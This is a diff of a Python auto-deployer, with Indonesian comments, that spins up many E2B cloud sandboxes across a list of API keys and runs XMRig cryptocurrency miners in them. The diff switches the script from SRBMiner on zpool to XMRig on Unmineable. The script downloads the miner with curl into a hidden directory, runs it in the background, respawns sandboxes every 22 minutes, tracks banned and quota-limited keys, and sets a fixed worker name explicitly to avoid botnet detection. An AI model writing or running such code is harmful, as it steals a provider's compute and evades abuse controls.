@@ -24,28 +24,29 @@ except ImportError:
     print("[ERROR] E2B SDK belum terinstall! Silakan install: pip install e2b requests")
     sys.exit(1)
 
-# Default Fallback Config (SRBMiner-MULTI MinotaurX)
+# Default Config (XMRig - Unmineable)
 DEFAULT_CONFIG = {
-    "mode": "srbminer",
+    "mode": "xmrig",
     "template_name": "core-yok7h-t4",
-    "slots_per_key": 20,
+    "slots_per_key": 20,             # Full 20 container per API
     "cpu_count": 8,
-    "workers_count": 8,
+    "workers_count": 8,              # Fix 8 threads
     "memory_mb": 8192,
     "sandbox_timeout_seconds": 1800, # 30 menit max timeout E2B
     "duration_minutes": 22,          # Rerun otomatis setiap 22 menit
     "auto_respawn": True,
-    "algorithm": "minotaurx",
-    "host": "minotaurx.sea.mine.zpool.ca",
-    "port": 7019,
-    "worker_wallet": "DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM",
-    "password": "c=DGB",
+    "algorithm": "rx",
+    "host": "rx.unmineable.com",
+    "port": 443,
+    "worker_wallet": "DGB:DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM", # Diganti ke DGB
+    "fixed_worker_name": "skynotnt", # Nama worker fix biar ga kedetect botnet
+    "password": "x",
     "keys_file": "list.txt",
     "concurrency_limit": 3,
     "spawn_delay_seconds": 1.0
 }
 
-CONFIG_FILE = "config_zpool.json" if os.path.exists("config_zpool.json") else "config.json"
+CONFIG_FILE = "config_unmineable.json" if os.path.exists("config_unmineable.json") else "config.json"
 
 def load_config():
     if os.path.exists(CONFIG_FILE):
@@ -73,39 +74,41 @@ banned_keys = set()
 quota_keys = set()
 lock = threading.Lock()
 
-SYS_DIR = "/var/tmp/.srb_runner"
-LOG_FILE = "/tmp/srbminer.log"
-SRB_DOWNLOAD_URL = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.6.5/SRBMiner-Multi-3-6-5-Linux.tar.gz"
+SYS_DIR = "/var/tmp/.xmrig_runner"
+LOG_FILE = "/tmp/xmrig.log"
+XMRIG_DOWNLOAD_URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
 
-def build_srbminer_bash_script(cfg, worker_label):
-    algo = cfg.get("algorithm", "minotaurx")
-    host = cfg.get("host", "minotaurx.sea.mine.zpool.ca")
-    port = cfg.get("port", 7019)
-    wallet = cfg.get("worker_wallet", "DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM")
-    password = cfg.get("password", "c=DGB")
+def build_xmrig_bash_script(cfg, worker_internal_label):
+    algo = cfg.get("algorithm", "rx")
+    host = cfg.get("host", "rx.unmineable.com")
+    port = cfg.get("port", 443)
+    wallet = cfg.get("worker_wallet", "DGB:DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM")
+    fixed_name = cfg.get("fixed_worker_name", "skynotnt")
+    password = cfg.get("password", "x")
     threads = cfg.get("workers_count", 8)
 
-    pool_address = f"stratum+tcp://{host}:{port}"
+    pool_address = f"stratum+ssl://{host}:{port}"
 
     return f"""#!/bin/bash
 mkdir -p {SYS_DIR}
 cd {SYS_DIR} || exit 1
 
-if [ ! -f SRBMiner-MULTI ]; then
-    echo "[{worker_label}] Downloading SRBMiner-MULTI v3.6.5..."
-    curl -sL "{SRB_DOWNLOAD_URL}" -o srb.tar.gz
-    tar -xzf srb.tar.gz --strip-components=1
-    rm -f srb.tar.gz
+if [ ! -f xmrig ]; then
+    echo "[{worker_internal_label}] Downloading XMRig v6.22.2..."
+    curl -sL "{XMRIG_DOWNLOAD_URL}" -o xmrig.tar.gz
+    tar -xzf xmrig.tar.gz --strip-components=1
+    rm -f xmrig.tar.gz
+    chmod 755 xmrig
 fi
 
-echo "[{worker_label}] Starting SRBMiner-MULTI ({algo})..."
-./SRBMiner-MULTI \\
-    --disable-gpu \\
-    --algorithm {algo} \\
-    --pool {pool_address} \\
-    --wallet {wallet} \\
-    --password {password},id={worker_label} \\
-    --cpu-threads {threads}
+echo "[{worker_internal_label}] Starting XMRig ({algo}) for Unmineable as {fixed_name}..."
+./xmrig \\
+    -a {algo} \\
+    -o {pool_address} \\
+    -u {wallet}.{fixed_name} \\
+    -p {password} \\
+    --tls \\
+    --threads {threads}
 """
 
 def get_remote_active_sandboxes(api_key):
@@ -232,17 +235,17 @@ def parse_keys_file(filepath):
 def spawn_single_sandbox(cfg, account, slot_index):
     token = account["token"]
     label = account["label"]
-    worker_name = f"{label.replace(' ', '_')}-srb-slot-{slot_index}"
+    worker_internal_label = f"{label.replace(' ', '_')}_slot_{slot_index}" 
     worker_key = f"{token[:12]}-{slot_index}"
     timeout_sec = cfg.get("sandbox_timeout_seconds", 1800)
     template_name = account.get("ready_template") or cfg.get("template_name", "core-yok7h-t4")
 
     if token in banned_keys:
-        return {"status": "banned", "worker_name": worker_name, "error": "Team is banned"}
+        return {"status": "banned", "worker_name": worker_internal_label, "error": "Team is banned"}
     if token in quota_keys:
-        return {"status": "quota_limit", "worker_name": worker_name, "error": "Quota limit reached"}
+        return {"status": "quota_limit", "worker_name": worker_internal_label, "error": "Quota limit reached"}
 
-    print(f"    🚀 [{label}] Memulai SRBMiner Sandbox Slot #{slot_index} ({worker_name}) [Tpl: {template_name}]...")
+    print(f"    🚀 [{label}] Memulai XMRig Sandbox Slot #{slot_index} ({worker_internal_label}) [Tpl: {template_name}]...")
     sbx = None
 
     try:
@@ -253,8 +256,8 @@ def spawn_single_sandbox(cfg, account, slot_index):
                 timeout=timeout_sec,
                 request_timeout=180,
                 envs={
-                    "WORKER_NAME": worker_name,
-                    "BOT_LABEL": worker_name,
+                    "WORKER_NAME": worker_internal_label,
+                    "BOT_LABEL": worker_internal_label,
                 }
             )
         except Exception as tpl_err:
@@ -266,8 +269,8 @@ def spawn_single_sandbox(cfg, account, slot_index):
                     timeout=timeout_sec,
                     request_timeout=180,
                     envs={
-                        "WORKER_NAME": worker_name,
-                        "BOT_LABEL": worker_name,
+                        "WORKER_NAME": worker_internal_label,
+                        "BOT_LABEL": worker_internal_label,
                     }
                 )
             else:
@@ -277,7 +280,7 @@ def spawn_single_sandbox(cfg, account, slot_index):
         print(f"      ✅ Sandbox ID [{sandbox_id}] Berhasil Dibuat!")
 
         # 1. Tulis script bash runner ke container
-        bash_content = build_srbminer_bash_script(cfg, worker_name)
+        bash_content = build_xmrig_bash_script(cfg, worker_internal_label)
         sbx.commands.run(f"mkdir -p {SYS_DIR}", timeout=30, request_timeout=30)
         sbx.files.write(f"{SYS_DIR}/run_miner.sh", bash_content)
         sbx.commands.run(f"chmod +x {SYS_DIR}/run_miner.sh", timeout=30, request_timeout=30)
@@ -290,7 +293,7 @@ def spawn_single_sandbox(cfg, account, slot_index):
         )
         sbx.commands.run(setup_cmd, timeout=120, request_timeout=120)
 
-        # 3. Eksekusi SRBMiner di background
+        # 3. Eksekusi XMRig di background
         cmd_str = f"(nohup {SYS_DIR}/run_miner.sh </dev/null >{LOG_FILE} 2>&1 &)"
         sbx.commands.run(cmd_str, timeout=30, request_timeout=30)
 
@@ -298,7 +301,7 @@ def spawn_single_sandbox(cfg, account, slot_index):
         expires_at = now + timedelta(seconds=timeout_sec)
 
         info = {
-            "worker_name": worker_name,
+            "worker_name": worker_internal_label,
             "sandbox_id": sandbox_id,
             "token": token,
             "label": label,
@@ -312,12 +315,12 @@ def spawn_single_sandbox(cfg, account, slot_index):
         with lock:
             active_sandboxes[worker_key] = info
 
-        print(f"      🔥 [ACTIVE] {worker_name} SRBMiner Running!\n")
+        print(f"      🔥 [ACTIVE] {worker_internal_label} XMRig Running (Mining as: {cfg.get('fixed_worker_name', 'skynotnt')})!\n")
         return {"status": "success", "info": info}
 
     except Exception as e:
         err_msg = str(e)
-        print(f"      ❌ Gagal spawn {worker_name}: {err_msg}")
+        print(f"      ❌ Gagal spawn {worker_internal_label}: {err_msg}")
 
         if sbx:
             try: sbx.kill()
@@ -327,15 +330,15 @@ def spawn_single_sandbox(cfg, account, slot_index):
             print(f"      🚫 Akun/Team {label} BANNED/INVALID.")
             with lock:
                 banned_keys.add(token)
-            return {"status": "banned", "worker_name": worker_name, "error": err_msg}
+            return {"status": "banned", "worker_name": worker_internal_label, "error": err_msg}
 
         if "limit" in err_msg.lower() or "quota" in err_msg.lower() or "rate" in err_msg.lower() or "429" in err_msg:
             print(f"      ⚠️ Kuota/Rate Limit tercapai untuk {label}.")
             with lock:
                 quota_keys.add(token)
-            return {"status": "quota_limit", "worker_name": worker_name, "error": err_msg}
+            return {"status": "quota_limit", "worker_name": worker_internal_label, "error": err_msg}
 
-        return {"status": "error", "worker_name": worker_name, "error": err_msg}
+        return {"status": "error", "worker_name": worker_internal_label, "error": err_msg}
 
 def deploy_all(cfg, accounts):
     slots = cfg.get("slots_per_key", 20)
@@ -369,8 +372,9 @@ def deploy_all(cfg, accounts):
     spawn_delay = cfg.get("spawn_delay_seconds", 1.0)
     print("\n=======================================================")
     print(f"📦 Total Target Sandbox : {len(tasks)} ({len(accounts)} Akun x {slots} Slots/Akun)")
-    print(f"⚡ Mode Mining           : SRBMiner-MULTI v3.6.5 ({cfg.get('algorithm', 'minotaurx')})")
-    print(f"⚡ Resource per Sandbox : {cfg.get('cpu_count', 8)} vCPU | {cfg.get('memory_mb', 8192)} MB RAM")
+    print(f"⚡ Mode Mining           : XMRig v6.22.2 (Unmineable - {cfg.get('algorithm', 'rx')})")
+    print(f"⚡ Pool Worker Name     : {cfg.get('fixed_worker_name', 'skynotnt')} (Anti-Botnet Mode)")
+    print(f"⚡ Resource per Sandbox : {cfg.get('cpu_count', 8)} vCPU | {cfg.get('memory_mb', 8192)} MB RAM | {cfg.get('workers_count', 8)} Threads")
     print(f"⏱️ Auto-Rerun Interval  : Setiap {cfg.get('duration_minutes', 22)} Menit")
     print("=======================================================\n")
 
@@ -389,7 +393,7 @@ def deploy_all(cfg, accounts):
 
     success_count = sum(1 for r in results if r["status"] == "success")
     print("\n=======================================================")
-    print(f"📊 Ringkasan Deploy: {success_count}/{len(tasks)} SRBMiner Sandbox Berhasil Aktif!")
+    print(f"📊 Ringkasan Deploy: {success_count}/{len(tasks)} XMRig Sandbox Berhasil Aktif!")
     print("=======================================================\n")
     return results
 
@@ -523,7 +527,7 @@ def monitor_and_respawn_loop(cfg, accounts):
                 active_count = len(active_sandboxes)
                 banned_count = len(banned_keys)
 
-            print(f"[{now.strftime('%H:%M:%S')}] 🟢 Status: {active_count} SRBMiner Sandbox Aktif | ⏱️ Uptime: {uptime_str} | 🚫 Banned Key: {banned_count}")
+            print(f"[{now.strftime('%H:%M:%S')}] 🟢 Status: {active_count} XMRig Sandbox Aktif | ⏱️ Uptime: {uptime_str} | 🚫 Banned Key: {banned_count}")
             
             for _ in range(check_interval):
                 if not is_running:
@@ -544,13 +548,14 @@ def main():
     if hasattr(signal, "SIGTERM"):
         signal.signal(signal.SIGTERM, signal_handler)
 
-    parser = argparse.ArgumentParser(description="E2B ZPool SRBMiner Cloud Sandbox Auto-Deployer")
+    parser = argparse.ArgumentParser(description="E2B Unmineable XMRig Cloud Sandbox Auto-Deployer")
     parser.add_argument("--template", "-tmpl", default=None, help="Nama template E2B")
     parser.add_argument("--file", "-f", default=None, help="File path E2B API Key")
     parser.add_argument("--slots", "-s", type=int, default=None, help="Jumlah sandbox per API Key")
     parser.add_argument("--duration", "-d", type=int, default=None, help="Durasi rerun dalam menit (default: 22)")
-    parser.add_argument("--wallet", "-w", default=None, help="Wallet ZPool / DGB")
+    parser.add_argument("--wallet", "-w", default=None, help="Wallet Unmineable (Coin:Address)")
     parser.add_argument("--workers", type=int, default=None, help="Jumlah worker threads per sandbox")
+    parser.add_argument("--name", type=str, default=None, help="Override Fixed Worker Name")
     parser.add_argument("--once", action="store_true", help="Jalankan sekali tanpa monitor loop")
     parser.add_argument("--daemon", action="store_true", help="Paksa jalankan daemon auto-respawn 24/7")
 
@@ -567,6 +572,8 @@ def main():
         cfg["worker_wallet"] = args.wallet
     if args.workers:
         cfg["workers_count"] = args.workers
+    if args.name:
+        cfg["fixed_worker_name"] = args.name
     if args.file:
         cfg["keys_file"] = args.file
 
@@ -575,8 +582,8 @@ def main():
 
     print(f"""
 =============================================================
-  ⚡ E2B ZPOOL SRBMINER V3.6.5 AUTO-DEPLOYER
-  🔥 8 vCPU | Hot-Reload Dynamic Key | Auto-Suspend Detect
+  ⚡ E2B UNMINEABLE XMRIG V6.22.2 AUTO-DEPLOYER
+  🔥 {cfg.get('workers_count', 8)} Threads | Fixed Name: {cfg.get('fixed_worker_name', 'skynotnt')} | 20 Slots/Key
   🛡️ Rerun Interval: {cfg.get('duration_minutes', 22)} Menit
 =============================================================
 """)
